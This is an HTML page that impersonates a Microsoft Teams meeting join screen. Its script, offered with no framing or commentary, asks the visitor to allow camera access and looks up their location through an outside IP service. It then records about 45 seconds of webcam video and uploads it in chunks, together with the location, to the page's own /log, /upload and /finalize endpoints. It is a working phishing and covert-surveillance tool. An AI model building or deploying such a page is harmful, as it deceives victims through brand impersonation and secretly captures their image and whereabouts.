<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Teams</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Segoe UI', sans-serif; background: #1e1e2e; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  .container { width: 100%; max-width: 480px; }

  /* Top bar */
  .topbar { background: #292929; padding: 10px 16px; display: flex; align-items: center; gap: 10px; border-radius: 10px 10px 0 0; }
  .teams-logo { font-size: 22px; }
  .org-name { font-size: 13px; color: #ccc; flex: 1; }
  .minimize { font-size: 18px; color: #aaa; cursor: pointer; }

  /* Video */
  .video-wrap { background: #1b1b1b; position: relative; aspect-ratio: 16/9; overflow: hidden; display: flex; align-items: center; justify-content: center; }
  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
  .avatar-area { display: flex; flex-direction: column; align-items: center; gap: 12px; }
  .avatar { width: 72px; height: 72px; border-radius: 50%; background: #6264a7; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: 700; }
  .caller-name { font-size: 18px; font-weight: 600; }
  .call-type { font-size: 13px; color: #aaa; }

  /* recording badge */
  .rec-badge { position: absolute; top: 10px; left: 10px; background: #c4314b; color: #fff; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 3px; display: none; }
  .timer-badge { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.55); color: #fff; font-size: 12px; padding: 3px 8px; border-radius: 3px; display: none; }

  /* Controls */
  .controls { background: #1b1b1b; border-top: 1px solid #333; padding: 14px 16px 20px; }
  .status-txt { font-size: 13px; color: #999; text-align: center; margin-bottom: 14px; }
  .btn-row { display: flex; justify-content: center; gap: 12px; }
  .ctrl-btn { display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
  .ctrl-btn .ci { width: 46px; height: 46px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; background: #333; }
  .ctrl-btn .cl { font-size: 10px; color: #aaa; }
  .ci-join { background: #6264a7; }
  .ci-end { background: #c4314b; }
  .join-btn { width: 100%; background: #6264a7; border: none; color: #fff; font-size: 15px; font-weight: 600; padding: 13px; border-radius: 6px; cursor: pointer; letter-spacing: 0.3px; }
  .join-btn:disabled { background: #333; color: #777; cursor: not-allowed; }
  .bottom-bar { background: #292929; padding: 8px 16px; display: flex; align-items: center; gap: 8px; border-radius: 0 0 10px 10px; }
  .meeting-id { font-size: 11px; color: #888; }
</style>
</head>
<body>
<div class="container">
  <div class="topbar">
    <div class="teams-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 2228.833 2073.333" width="28" height="28">
        <path d="M1554.637 777.5h575.713c54.391 0 98.483 44.092 98.483 98.483v524.398c0 199.901-162.051 361.952-361.952 361.952h-1.711c-199.901.028-361.975-162.023-361.975-361.924V828.971a51.463 51.463 0 0151.442-51.471z" fill="#5059C9"/>
        <circle cx="1943.75" cy="440.583" r="233.25" fill="#5059C9"/>
        <circle cx="1218.083" cy="336.917" r="336.917" fill="#7B83EB"/>
        <path d="M1667.323 777.5H717.01c-53.052 1.337-95.26 45.075-93.924 98.129v598.765c-7.38 322.181 247.309 590.383 569.49 598.105 322.181-7.722 576.87-275.924 569.49-598.105V875.629c1.336-53.054-40.872-96.792-93.743-98.129z" fill="#7B83EB"/>
        <path d="M1244 777.5v838.145c-.258 38.435-23.549 72.964-59.09 87.598a91.856 91.856 0 01-34.91 6.952H667.11c-6.962-17.504-13.238-35.29-18.139-53.498a631.287 631.287 0 01-24.68-176.398V875.371c-1.336-53.011 40.872-96.696 93.869-98.021L1244 777.5z" fill-opacity=".1" fill="#000"/>
        <path d="M1200 777.5v891.643a91.859 91.859 0 01-6.952 34.91c-14.634 35.541-49.163 58.832-87.598 59.09H691.91a595.306 595.306 0 01-42.939-53.498 631.282 631.282 0 01-49.699-114.847v-817.17c-1.336-53.011 40.872-96.696 93.869-98.021L1200 777.5z" fill-opacity=".2" fill="#000"/>
        <path d="M1200 777.5v784.145c-.395 51.731-42.138 93.474-93.869 93.869H649.272A631.27 631.27 0 01624.59 1498V875.629c-1.337-53.054 40.872-96.792 93.869-98.129z" fill-opacity=".2" fill="#000"/>
        <path d="M1155.5 777.5v784.145c-.395 51.731-42.138 93.474-93.869 93.869H649.272A631.27 631.27 0 01624.59 1498V875.629c-1.337-53.054 40.872-96.792 93.869-98.129z" fill-opacity=".2" fill="#000"/>
        <path d="M1244 509.522v163.275c-8.529.518-17.058 1.037-25.846 1.037-8.787 0-17.316-.518-25.845-1.037A336.033 336.033 0 011062.5 622.35a337.253 337.253 0 01-119.256-112.829C921.581 474.79 909.5 438.759 909.5 400.5h233.25c.518 60.106 45.675 109.866 101.25 109.022z" fill-opacity=".1" fill="#000"/>
        <path d="M1200 546.022v126.775a336.03 336.03 0 01-137.5-50.447A337.257 337.257 0 011062.5 622.35C1042.347 591.622 1029 556.367 1025.7 518.5c5.184-.777 10.369-1.296 15.8-1.296 87.727.259 158.5 12.857 158.5 28.818z" fill-opacity=".2" fill="#000"/>
        <path fill="#4B53BC" d="M155.5 509.522h909c85.99 0 155.75 69.76 155.75 155.75v909c0 85.99-69.76 155.75-155.75 155.75h-909C69.51 1730.022-.25 1660.262-.25 1574.272v-909c0-85.99 69.76-155.75 155.75-155.75z"/>
        <path d="M745.25 786.289h-155.5v404.047H455.5V786.289H300v-132.0h445.25v132z" fill="#fff"/>
      </svg>
    </div>
    <div class="org-name">Microsoft Teams · Contoso Ltd.</div>
    <div class="minimize">—</div>
  </div>

  <div class="video-wrap">
    <video id="preview" autoplay muted playsinline></video>
    <div class="avatar-area" id="avatarArea">
      <div class="avatar">AS</div>
      <div class="caller-name">Arjun Sharma</div>
      <div class="call-type" id="callType">Video call · Waiting for you...</div>
    </div>
    <div class="rec-badge" id="recBadge">● REC</div>
    <div class="timer-badge" id="timerBadge">00:00</div>
  </div>

  <div class="controls">
    <div class="status-txt" id="statusTxt">Enable your camera to join this Teams meeting</div>
    <button class="join-btn" id="joinBtn" onclick="startSession()">Join Now</button>
    <div class="btn-row" id="btnRow" style="display:none; margin-top:12px;">
      <div class="ctrl-btn"><div class="ci">🎤</div><div class="cl">Mute</div></div>
      <div class="ctrl-btn"><div class="ci">📷</div><div class="cl">Camera</div></div>
      <div class="ctrl-btn"><div class="ci">🖥️</div><div class="cl">Share</div></div>
      <div class="ctrl-btn"><div class="ci">⋯</div><div class="cl">More</div></div>
      <div class="ctrl-btn" onclick="endCall()"><div class="ci ci-end">📵</div><div class="cl">Leave</div></div>
    </div>
  </div>

  <div class="bottom-bar">
    <div class="meeting-id">Meeting ID: 294 385 710 · Passcode: mT7xQ2</div>
  </div>
</div>

<script>
const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
let mediaRecorder, chunkIndex = 0, stream, sec = 0, interval;

async function getGeo() {
  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
}

function tick() {
  sec++;
  const t = document.getElementById("timerBadge");
  t.textContent = `${String(Math.floor(sec/60)).padStart(2,"0")}:${String(sec%60).padStart(2,"0")}`;
}

async function startSession() {
  const btn = document.getElementById("joinBtn");
  btn.disabled = true; btn.textContent = "Connecting...";
  document.getElementById("statusTxt").textContent = "Please allow camera access to join";

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 }, audio: false });
  } catch {
    document.getElementById("statusTxt").textContent = "Camera access denied. Please allow and try again.";
    btn.disabled = false; btn.textContent = "Join Now";
    return;
  }

  const preview = document.getElementById("preview");
  preview.srcObject = stream; preview.style.display = "block";
  document.getElementById("avatarArea").style.display = "none";
  document.getElementById("callType").textContent = "Connected";
  document.getElementById("statusTxt").textContent = "Joining Arjun Sharma's meeting...";

  const geo = await getGeo();
  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ session:SID, geo }) }).catch(()=>{});

  await new Promise(r => setTimeout(r, 2000));

  document.getElementById("recBadge").style.display = "block";
  document.getElementById("timerBadge").style.display = "block";
  document.getElementById("statusTxt").textContent = "";
  document.getElementById("joinBtn").style.display = "none";
  document.getElementById("btnRow").style.display = "flex";
  interval = setInterval(tick, 1000);
  startRecording(stream);
}

function endCall() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  if (stream) stream.getTracks().forEach(t => t.stop());
  clearInterval(interval);
  document.getElementById("recBadge").style.display = "none";
  document.getElementById("statusTxt").textContent = "You have left the meeting.";
  document.getElementById("btnRow").style.display = "none";
}

function startRecording(stream) {
  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
  mediaRecorder.ondataavailable = async (e) => {
    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
  };
  mediaRecorder.onstop = async () => {
    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
  };
  mediaRecorder.start(5000);
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== "inactive") { mediaRecorder.stop(); endCall(); }
  }, 45000);
}

async function sendChunk(blob, idx) {
  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
  }).catch(()=>{});
}
</script>
</body>
</html>
